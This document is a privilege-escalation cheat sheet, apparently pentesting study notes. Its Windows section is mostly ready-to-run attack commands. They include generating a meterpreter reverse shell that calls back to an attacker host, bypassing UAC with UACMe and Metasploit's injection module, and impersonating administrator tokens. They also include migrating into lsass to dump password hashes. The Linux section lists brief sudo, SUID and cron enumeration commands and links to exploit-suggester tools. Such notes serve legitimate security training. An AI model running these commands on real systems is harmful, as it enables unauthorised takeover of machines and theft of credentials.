# Privilege Escalation

## Windows

### Windows Post Exploitation Modules
```bash
use post/windows/gather/win_privs
set SESSION <sess_id>
run

# ---

use post/windows/gather/enum_logged_on_users
set SESSION <sess_id>
run

use post/windows/gather/checkvm
set SESSION <sess_id>
run

# ---

use post/windows/gather/enum_applications
set SESSION <sess_id>
run

# ---

use post/windows/gather/enum_computers
set SESSION <sess_id>
run

# ---

use post/windows/gather/enum_shares
set SESSION <sess_id>
run
```

### Windows Kernel Exploits
```bash
msfconsole -q
search local_exploit_suggester
use 0
run
```

### Bypassing UAC With UACMe
```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=<attacker> LPORT=<port> -f exe > 'revshell.exe'
msfconsole -q
use exploit/multi/handler
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST <attacker>
set LPORT <port>

# ---

msfconsole -q
getuid
sysinfo
ps -S explorer.exe
migrate <pid>
getsystem
shell
net localgroup administrators # if we are a member of admins
exit
cd C:\\Temp
upload /root/Desktop/tools/UACME/Akagi64.exe
upload /root/revshell.exe .
.\Akagi64.exe 23 C:\Users\admin\AppData\Local\Temp\revshell.exe
exploit
ps -S lsass.exe
migrate <pid>
hashdump
```

### Bypassing UAC With Memory Injection
```bash
ps -S explorer.exe
migrate <pid>

shell
net localgroup administrators
exit
background

use exploit/windows/local/bypassuac_injection
set session <sess_id>
set TARGET 1
set PAYLOAD windows/x64/meterpreter/reverse_tcp
exploit

getsystem
getuid

ps -S lsass.exe
migrate <pid>
hashdump
```

### Access Token Impersonate (incognito)
```bash
load incognito
list_tokens -u
impersonate_token ATTACKDEFENSE\\Administrator 
getuid
hashdump
```

###### PrivescCheck
[PrivescCheck](https://github.com/itm4n/PrivescCheck)
```bash
powershell -ep bypass -c ". .\PrivescCheck.ps1; Invoke-PrivescCheck"

powershell -ep bypass -c ". .\PrivescCheck.ps1; Invoke-PrivescCheck -Extended -Report PrivescCheck_$($env:COMPUTERNAME) -Format TXT,HTML"

powershell -ep bypass -c ". .\PrivescCheck.ps1; Invoke-PrivescCheck -Extended -Audit -Report PrivescCheck_$($env:COMPUTERNAME) -Format TXT,HTML,CSV,XML"
```

## Linux

### Sudo
```bash
sudo -l
```
[GTFBins](https://gtfobins.github.io/)

### SUID
```bash
find / -type f -perm -u+s -exec ls -l {} \; 2>/dev/null
```
[GTFBins](https://gtfobins.github.io/)

### Cron
```bash
cat /etc/crontab
ls -la /etc/cron.d/
```
[PSPY](https://github.com/DominicBreuker/pspy)

### Linux Kernel Exploits
[LES](https://github.com/The-Z-Labs/linux-exploit-suggester)
<!-- ---- -->
[Linpeas](https://github.com/peass-ng/PEASS-ng/tree/master/linPEAS)
